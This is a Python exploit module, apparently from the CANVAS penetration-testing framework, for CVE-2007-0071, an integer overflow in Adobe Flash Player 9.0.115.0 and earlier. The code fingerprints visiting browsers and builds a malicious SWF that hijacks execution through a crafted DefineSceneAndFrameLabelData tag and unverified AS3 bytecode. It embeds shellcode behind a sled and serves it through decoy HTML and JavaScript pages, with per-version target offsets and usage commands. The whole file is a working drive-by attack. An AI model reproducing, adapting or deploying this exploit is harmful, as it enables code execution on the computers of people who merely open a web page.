##ImmunityHeader v1 
###############################################################################
## File       :  flash_duke.py
## Description:  
##            :  
## Created_On :  Sun Jan  3 18:29:38 2010
## Created_By :  Justin Seitz
## Modified_On:  Sun Jan  3 18:35:10 2010
## Modified_By:  Justin Seitz
##
## (c) Copyright 2010, Immunity, Inc. all rights reserved.
###############################################################################
#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct

from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef
from httpclientside import httpclientside
from libs.ua_parser import user_agent_parser

NAME='Adobe Flash Player DefineSceneAndFrameLabelData Tag Overflow'
DESCRIPTION='Adobe Flash Player (<= 9.0.115.0) DefineSceneAndFrameLabelData Tag Integer Overflow'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Adobe"
DOCUMENTATION['Date public']='04/14/2008'
DOCUMENTATION['References']='http://documents.iss.net/whitepapers/IBM_X-Force_WP_final.pdf'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']='Adobe Flash Player 9.0.115.0 and below'
DOCUMENTATION['CVE Name'] = 'CVE-2007-0071'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-0071'
DOCUMENTATION['CVSS'] = 9.3


VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP','2003','Vista']
PROPERTY['DELIVERY'] = 'HTTP'

NOTES="""
MUCH KUDOS TO DUKE FOR BEING AWESOME LOL

Tested on:
Windows XP Professional SP2 English UP2DATE with Adobe Flash Player 9.0.115.0 in IE 7 (with DEP OptIn which is default)
Windows XP Professional SP3rc2 English OOTB with Adobe Flash Player 9.0.47.0 in IE 6 (with DEP OptIn which is default)
Windows XP Professional SP3rc2 English OOTB with Adobe Flash Player 9.0.47.0 in IE 7 (with DEP OptIn which is default)
Windows Vista Ultimate SP0 English OOTB with Adobe Flash Player 9.0.115.0 in IE 7 (with DEP OptIn which is default)

Usage:
./commandlineInterface.py -p 5555 -v 1
./exploits/httpserver/httpserver.py -v 1 -O singleexploit:flash_duke -l 10.10.11.1 -d 5555 -p 8080  
"""

CHANGELOG="""
"""

targets={
    0: ['Autodetect (N/A)','0,0,0,0'],
    #Description, Flash version, AS3_argmask_address, Marker, Offset to EIP, Offset to codePtr
    1: ['Adobe Flash Player 9.0.115.0 in IE (DEP OptIn)','9.0.115.0',0x302b3830,0xf8,0x79,0x75], #flash9e.ocx
    2: ['Adobe Flash Player 9.0.47.0 in IE (DEP OptIn)','9.0.47.0',0x302046d0,0xf5,0x75,0x71], #flash9d.ocx
}

class theexploit(httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.clientversion = 0
        self.badstring     = '\0\xff'
        self.name          = NAME 
        self.htmlfilename  = 'duke.html'
        self.swffilename   = 'duke.swf'
        self.jsfilename    = 'AC_RunActiveContent.js'
        self.refresh_rate  = 60


    def is_vulnerable(self, info_dict):
        vuln = ( ('9', '0', '115', '0'),
                 ('9', '0', '47', '0') )
    
        parsed = user_agent_parser.Parse(info_dict['user_agent'])

        if 'Windows' not in parsed['os']['family']:
            return 0

        if 'plugins' not in info_dict: return 0

        version = info_dict['plugins'].get('IE Flash', None)

        # expected format "WIN 10.3.181.23"
        if not version: return 0
        
        version = version.split()[1]
        ver, major, minor, build = version.split('.')

        if (ver, major, minor, build) in vuln: return 100
        return 0

    def makeJS(self):
        js="""//v1.7
// Flash Player Version Detection
// Detect Client Browser type
// Copyright 2005-2007 Adobe Systems Incorporated.  All rights reserved.
var isIE  = (navigator.appVersion.indexOf("MSIE") != -1) ? true : false;
var isWin = (navigator.appVersion.toLowerCase().indexOf("win") != -1) ? true : false;
var isOpera = (navigator.userAgent.indexOf("Opera") != -1) ? true : false;

function ControlVersion()
{
          var version;
          var axo;
          var e;

          // NOTE : new ActiveXObject(strFoo) throws an exception if strFoo isn't in the registry

          try {
          // version will be set for 7.X or greater players
          axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.7");
          version = axo.GetVariable("$version");
          } catch (e) {
          }

          if (!version)
          {
          try {
          // version will be set for 6.X players only
          axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.6");

          // installed player is some revision of 6.0
          // GetVariable("$version") crashes for versions 6.0.22 through 6.0.29,
          // so we have to be careful. 

          // default to the first public version
          version = "WIN 6,0,21,0";

          // throws if AllowScripAccess does not exist (introduced in 6.0r47)		
          axo.AllowScriptAccess = "always";

          // safe to call for 6.0r47 or greater
          version = axo.GetVariable("$version");

          } catch (e) {
          }
          }

          if (!version)
          {
          try {
          // version will be set for 4.X or 5.X player
          axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.3");
          version = axo.GetVariable("$version");
          } catch (e) {
          }
          }

          if (!version)
          {
          try {
          // version will be set for 3.X player
          axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.3");
          version = "WIN 3,0,18,0";
          } catch (e) {
          }
          }

          if (!version)
          {
          try {
          // version will be set for 2.X player
          axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash");
          version = "WIN 2,0,0,11";
          } catch (e) {
          version = -1;
          }
          }

          return version;
}

// JavaScript helper required to detect Flash Player PlugIn version information
function GetSwfVer(){
          // NS/Opera version >= 3 check for Flash plugin in plugin array
          var flashVer = -1;

          if (navigator.plugins != null && navigator.plugins.length > 0) {
          if (navigator.plugins["Shockwave Flash 2.0"] || navigator.plugins["Shockwave Flash"]) {
          var swVer2 = navigator.plugins["Shockwave Flash 2.0"] ? " 2.0" : "";
          var flashDescription = navigator.plugins["Shockwave Flash" + swVer2].description;
          var descArray = flashDescription.split(" ");
          var tempArrayMajor = descArray[2].split(".");			
          var versionMajor = tempArrayMajor[0];
          var versionMinor = tempArrayMajor[1];
          var versionRevision = descArray[3];
          if (versionRevision == "") {
          versionRevision = descArray[4];
          }
          if (versionRevision[0] == "d") {
          versionRevision = versionRevision.substring(1);
          } else if (versionRevision[0] == "r") {
          versionRevision = versionRevision.substring(1);
          if (versionRevision.indexOf("d") > 0) {
          versionRevision = versionRevision.substring(0, versionRevision.indexOf("d"));
          }
          }
          var flashVer = versionMajor + "." + versionMinor + "." + versionRevision;
          }
          }
          // MSN/WebTV 2.6 supports Flash 4
          else if (navigator.userAgent.toLowerCase().indexOf("webtv/2.6") != -1) flashVer = 4;
          // WebTV 2.5 supports Flash 3
          else if (navigator.userAgent.toLowerCase().indexOf("webtv/2.5") != -1) flashVer = 3;
          // older WebTV supports Flash 2
          else if (navigator.userAgent.toLowerCase().indexOf("webtv") != -1) flashVer = 2;
          else if ( isIE && isWin && !isOpera ) {
          flashVer = ControlVersion();
          }	
          return flashVer;
}

// When called with reqMajorVer, reqMinorVer, reqRevision returns true if that version or greater is available
function DetectFlashVer(reqMajorVer, reqMinorVer, reqRevision)
{
          versionStr = GetSwfVer();
          if (versionStr == -1 ) {
          return false;
          } else if (versionStr != 0) {
          if(isIE && isWin && !isOpera) {
          // Given "WIN 2,0,0,11"
          tempArray         = versionStr.split(" "); 	// ["WIN", "2,0,0,11"]
          tempString        = tempArray[1];			// "2,0,0,11"
          versionArray      = tempString.split(",");	// ['2', '0', '0', '11']
          } else {
          versionArray      = versionStr.split(".");
          }
          var versionMajor      = versionArray[0];
          var versionMinor      = versionArray[1];
          var versionRevision   = versionArray[2];

          // is the major.revision >= requested major.revision AND the minor version >= requested minor
          if (versionMajor > parseFloat(reqMajorVer)) {
          return true;
          } else if (versionMajor == parseFloat(reqMajorVer)) {
          if (versionMinor > parseFloat(reqMinorVer))
          return true;
          else if (versionMinor == parseFloat(reqMinorVer)) {
          if (versionRevision >= parseFloat(reqRevision))
          return true;
          }
          }
          return false;
          }
}

function AC_AddExtension(src, ext)
{
          if (src.indexOf('?') != -1)
          return src.replace(/\?/, ext+'?'); 
          else
          return src + ext;
}

function AC_Generateobj(objAttrs, params, embedAttrs) 
{ 
          var str = '';
          if (isIE && isWin && !isOpera)
          {
          str += '<object ';
          for (var i in objAttrs)
          {
          str += i + '="' + objAttrs[i] + '" ';
          }
          str += '>';
          for (var i in params)
          {
          str += '<param name="' + i + '" value="' + params[i] + '" /> ';
          }
          str += '</object>';
          }
          else
          {
          str += '<embed ';
          for (var i in embedAttrs)
          {
          str += i + '="' + embedAttrs[i] + '" ';
          }
          str += '> </embed>';
          }

          document.write(str);
}

function AC_FL_RunContent(){
          var ret = 
          AC_GetArgs
          (  arguments, ".swf", "movie", "clsid:d27cdb6e-ae6d-11cf-96b8-444553540000"
          , "application/x-shockwave-flash"
          );
          AC_Generateobj(ret.objAttrs, ret.params, ret.embedAttrs);
}

function AC_SW_RunContent(){
          var ret = 
          AC_GetArgs
          (  arguments, ".dcr", "src", "clsid:166B1BCA-3F9C-11CF-8075-444553540000"
          , null
          );
          AC_Generateobj(ret.objAttrs, ret.params, ret.embedAttrs);
}

function AC_GetArgs(args, ext, srcParamName, classid, mimeType){
          var ret = new Object();
          ret.embedAttrs = new Object();
          ret.params = new Object();
          ret.objAttrs = new Object();
          for (var i=0; i < args.length; i=i+2){
          var currArg = args[i].toLowerCase();    

          switch (currArg){	
          case "classid":
          break;
          case "pluginspage":
          ret.embedAttrs[args[i]] = args[i+1];
          break;
          case "src":
          case "movie":	
          args[i+1] = AC_AddExtension(args[i+1], ext);
          ret.embedAttrs["src"] = args[i+1];
          ret.params[srcParamName] = args[i+1];
          break;
          case "onafterupdate":
          case "onbeforeupdate":
          case "onblur":
          case "oncellchange":
          case "onclick":
          case "ondblclick":
          case "ondrag":
          case "ondragend":
          case "ondragenter":
          case "ondragleave":
          case "ondragover":
          case "ondrop":
          case "onfinish":
          case "onfocus":
          case "onhelp":
          case "onmousedown":
          case "onmouseup":
          case "onmouseover":
          case "onmousemove":
          case "onmouseout":
          case "onkeypress":
          case "onkeydown":
          case "onkeyup":
          case "onload":
          case "onlosecapture":
          case "onpropertychange":
          case "onreadystatechange":
          case "onrowsdelete":
          case "onrowenter":
          case "onrowexit":
          case "onrowsinserted":
          case "onstart":
          case "onscroll":
          case "onbeforeeditfocus":
          case "onactivate":
          case "onbeforedeactivate":
          case "ondeactivate":
          case "type":
          case "codebase":
          case "id":
          ret.objAttrs[args[i]] = args[i+1];
          break;
          case "width":
          case "height":
          case "align":
          case "vspace": 
          case "hspace":
          case "class":
          case "title":
          case "accesskey":
          case "name":
          case "tabindex":
          ret.embedAttrs[args[i]] = ret.objAttrs[args[i]] = args[i+1];
          break;
          default:
          ret.embedAttrs[args[i]] = ret.params[args[i]] = args[i+1];
          }
          }
          ret.objAttrs["classid"] = classid;
          if (mimeType) ret.embedAttrs["type"] = mimeType;
          return ret;
}
"""
        return js

    def encodeSWFInteger(self,i):
        if i==0:
            return '\0'
        s=''
        while i!=0:
            b=i&0x7f
            i>>=7
            if i!=0:
                b|=0x80
            s+=chr(b)
        return s

    def encodeSWFString(self,s):
        return self.encodeSWFInteger(len(s))+s

    def makeABC(self,marker_byte):
        marker=chr(marker_byte)
        #http://www.adobe.com/devnet/actionscript/articles/avm2overview.pdf
        abc=''
        abc+=struct.pack('<HH',16,46) #minor_version, major_version
        #cpool_info
        abc+=struct.pack('<BBB',0,0,0) #int_count, uint_count, double_count
        abc+=struct.pack('<B',0) #string_count
        abc+=struct.pack('<B',0) #namespace_count
        abc+=struct.pack('<B',0) #ns_set_count
        abc+=struct.pack('<B',0) #multiname_count
        abc+=struct.pack('<B',1)+'\0'*4 #method_count, method_info
        abc+=struct.pack('<B',0) #metadata_count
        abc+=struct.pack('<B',0) #class_count
        abc+=struct.pack('<B',1) #script_count
        abc+=struct.pack('<BB',0,0) #script_info&trait_info
        abc+=struct.pack('<B',1) #method_body_count
        #unverified bytecode thanks to 'marker's
        bytecode=''
        bytecode+=marker+'\x62'+self.encodeSWFInteger(targets[self.clientversion][4]) #offset to saved EIP
        bytecode+=marker+'\x62'+self.encodeSWFInteger(targets[self.clientversion][5]) #offset to codePtr
        bytecode+=marker+'\xe8\x25\xfe\xff\xff\x00'
        bytecode+=marker+'\x29\x02'
        bytecode+=marker+'\x63'+self.encodeSWFInteger(targets[self.clientversion][4]) #offset to saved EIP
        bytecode+='\x47'
        #method_body
        abc+=struct.pack('<BBBBBs',0,2,1,1,9,self.encodeSWFInteger(len(bytecode)))+bytecode+struct.pack('<BB',0,0)
        return abc

    def makeSWF(self):
        swf=''
        #http://download.macromedia.com/pub/flash/licensing/file_format_specification_v9.pdf
        swf+='\x78\x00\x05\x5f\x00\x00\x0f\xa0\x00' #FrameSize 'in twits'
        
        try:
            AS3_argmask_address,marker_byte=(targets[self.clientversion][2],targets[self.clientversion][3])
        except IndexError:
            # This just means we passed in an auto-version for which we don't support
            # so we pick the newest flash player version as our version
            self.clientversion = 1
            AS3_argmask_address,marker_byte=(targets[self.clientversion][2],targets[self.clientversion][3])
            
            
        address=AS3_argmask_address+(marker_byte-(marker_byte%4))+4
        scene_count=(0x80000000|(address/12))
        swf+=struct.pack('<HH',0x0c00,0x3030) #FrameRate, FrameCount (results in 0xffff2f2f being written)
        swf+=struct.pack('<HL',(69<<6)|4,8) #FileAttributes tag
        data=self.encodeSWFInteger(scene_count)+'\0\0\0'
        swf+=struct.pack('<HL',(86<<6)|0x3f,len(data))+data #DefineSceneAndFrameLabelData tag
        data=''
        data+=self.shellcode
        data+='A'*0x1a3 #nop sled
        data+=mosdef.assemble('jmp $-%d'%(len(data)+5),'x86') #jump backwards
        swf+=struct.pack('<HLH',(6<<6)|0x3f,len(data)+2,0x9090)+data #DefineBits tag
        abc=self.makeABC(marker_byte)
        swf+=struct.pack('<HLLB',(82<<6)|0x3f,len(abc)+5,0,0)+abc #DoABC tag
        swf+=struct.pack('<HH',(1<<6)|0x00,0) #ShowFrame tag
        swf='FWS\x09'+struct.pack('<L',len(swf)+4+4)+swf #Signature, Version, FileLength
        return swf

    def makeHTML(self):
        html="""<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Duke</title>
<script language="javascript">AC_FL_RunContent = 0;</script>
<script src="AC_RunActiveContent.js" language="javascript"></script>
</head>
<body bgcolor="#ffffff">
<!--url's used in the movie-->
<!--text used in the movie-->
<!-- saved from url=(0013)about:internet -->
<script language="javascript">
            if (AC_FL_RunContent == 0) {
            alert("This page requires AC_RunActiveContent.js.");
            } else {
            AC_FL_RunContent(
            'codebase', 'http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,0,0',
            'width', '550',
            'height', '400',
            'src', 'SWFBASENAME',
            'quality', 'high',
            'pluginspage', 'http://www.macromedia.com/go/getflashplayer',
            'align', 'middle',
            'play', 'true',
            'loop', 'true',
            'scale', 'showall',
            'wmode', 'window',
            'devicefont', 'false',
            'id', 'SWFBASENAME',
            'bgcolor', '#ffffff',
            'name', 'SWFBASENAME',
            'menu', 'true',
            'allowFullScreen', 'false',
            'allowScriptAccess','sameDomain',
            'movie', 'SWFBASENAME',
            'salign', ''
            ); //end AC code
            }
</script>
<noscript>
            <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,0,0" width="550" height="400" id="Untitled-17" align="middle">
            <param name="allowScriptAccess" value="sameDomain" />
            <param name="allowFullScreen" value="false" />
            <param name="movie" value="SWFBASENAME.swf" /><param name="quality" value="high" /><param name="bgcolor" value="#ffffff" />	<embed src="SWFBASENAME.swf" quality="high" bgcolor="#ffffff" width="550" height="400" name="SWFBASENAME" align="middle" allowScriptAccess="sameDomain" allowFullScreen="false" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" />
            </object>
</noscript>
</body>
</html>
""".replace('SWFBASENAME',self.swffilename[:self.swffilename.find('.')])
        return html

    def makesploit(self,clientheader,clientbody):
        from libs.spkproxy import header,body
        h=header('SERVER')
        b=body()
        if clientheader.URL.count(self.htmlfilename):
            self.log('Serving HTML file')
            b.setBody(self.makeHTML())
            h.addHeader('Content-Type','text/html')
        elif clientheader.URL.count(self.jsfilename):
            self.log('Serving JS file')
            b.setBody(self.makeJS())
            h.addHeader('Content-Type','text/javascript')
        elif clientheader.URL.count(self.swffilename):
            self.log("Serving our attack SFW")
            flash_version=clientheader.getStrValue(['x-flash-version'])
            flash_version=flash_version.replace(',','.')
            for i in range(len(targets)):
                if flash_version==targets[i][1]:
                    self.clientversion=i
                    break
            if self.clientversion==0:
                self.log('Unknown Adobe Flash Player v%s'%(flash_version))
                h.status='404'
                return h,b
            self.log('Serving SWF file for Adobe Flash Player v%s'%(flash_version))
            self.createShellcode()
            b.setBody(self.makeSWF())
            h.addHeader('Content-Type','application/x-shockwave-flash')
        else:
            self.log('redirecting to self')
            h.status='302'
            h.addHeader('Location',self.htmlfilename)
            h.addHeader('Content-Type','text/html')
        return h,b

    def getArgs(self):
        self.host=self.target.interface
        self.swffilename=self.argsDict.get('swffilename',self.swffilename)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'Version %d: %s'%(t,targets[t][0])
        return

    def run(self):
        self.getArgs()
        self.clientversion=self.version
        filedata=self.makeSWF()
        self.log('Opening %s for output'%(self.swffilename))
        fd=file(self.swffilename,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('Wrote to %s'%(self.swffilename))
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
